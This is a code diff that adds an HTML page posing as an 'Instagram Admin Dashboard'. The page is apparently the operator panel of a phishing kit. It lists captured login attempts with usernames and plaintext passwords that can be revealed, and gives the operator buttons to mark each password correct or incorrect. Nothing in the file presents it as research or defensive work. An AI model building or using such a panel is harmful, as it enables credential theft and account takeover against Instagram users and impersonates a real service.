@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Admin Dashboard</title>
+    <link rel="stylesheet" href="css/admin.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="header-content">
+                <div class="logo">
+                    <img src="img/instagram-text.png" alt="Instagram" class="logo-img">
+                    <span class="admin-badge">ADMIN</span>
+                </div>
+                <div class="admin-profile">
+                    <span class="admin-name">Administrator</span>
+                    <div class="profile-icon">
+                        <div class="profile-avatar">A</div>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <main>
+            <div class="admin-panel">
+                <h1>Admin Dashboard</h1>
+                <div class="stats-bar">
+                    <div class="stat-item">
+                        <span class="stat-value" id="totalRequests">0</span>
+                        <span class="stat-label">Total Requests</span>
+                    </div>
+                    <div class="stat-item">
+                        <span class="stat-value" id="pendingRequests">0</span>
+                        <span class="stat-label">Pending</span>
+                    </div>
+                    <div class="stat-item">
+                        <span class="stat-value" id="approvedRequests">0</span>
+                        <span class="stat-label">Approved</span>
+                    </div>
+                    <div class="stat-item">
+                        <span class="stat-value" id="rejectedRequests">0</span>
+                        <span class="stat-label">Rejected</span>
+                    </div>
+                </div>
+
+                <div class="section-header">
+                    <h2>Login Requests</h2>
+                    <div class="filter-controls">
+                        <button class="filter-btn active" data-filter="all">All</button>
+                        <button class="filter-btn" data-filter="pending">Pending</button>
+                        <button class="filter-btn" data-filter="approved">Approved</button>
+                        <button class="filter-btn" data-filter="rejected">Rejected</button>
+                    </div>
+                </div>
+
+                <div class="login-requests" id="loginRequestsContainer">
+                    <div class="empty-state" id="emptyState">
+                        <i class="fas fa-user-shield"></i>
+                        <p>No login requests yet</p>
+                        <span>Waiting for users to log in...</span>
+                    </div>
+                    
+                    <!-- Login requests will be added here dynamically -->
+                </div>
+            </div>
+        </main>
+
+        <footer>
+            <div class="footer-content">
+                <p>Instagram Admin Panel &copy; <span id="currentYear">2023</span></p>
+                <a href="index.html" class="logout-link">Log Out</a>
+            </div>
+        </footer>
+    </div>
+
+    <!-- Template for login request card -->
+    <template id="loginRequestTemplate">
+        <div class="login-request-card" data-request-id="" data-status="pending">
+            <div class="request-header">
+                <div class="user-avatar"></div>
+                <div class="request-info">
+                    <h3 class="username"></h3>
+                    <span class="timestamp"></span>
+                </div>
+                <div class="status-badge pending">Pending</div>
+            </div>
+            <div class="request-details">
+                <div class="detail-row">
+                    <span class="detail-label">Username:</span>
+                    <span class="detail-value username-display"></span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Password:</span>
+                    <span class="detail-value password-display"></span>
+                    <button class="toggle-password" aria-label="Toggle password visibility">
+                        <i class="fas fa-eye"></i>
+                    </button>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Login Time:</span>
+                    <span class="detail-value login-time"></span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">IP Address:</span>
+                    <span class="detail-value ip-address">127.0.0.1</span>
+                </div>
+            </div>
+            <div class="request-actions">
+                <button class="action-btn approve-btn" data-action="approve">
+                    <i class="fas fa-check"></i> Correct Password (Approve)
+                </button>
+                <button class="action-btn reject-btn" data-action="reject">
+                    <i class="fas fa-times"></i> Incorrect Password (Reject)
+                </button>
+            </div>
+            <div class="admin-note">
+                <p>As an administrator, you're verifying if the entered credentials are correct.</p>
+            </div>
+        </div>
+    </template>
+
+    <script src="js/admin.js"></script>
+</body>
+</html> 
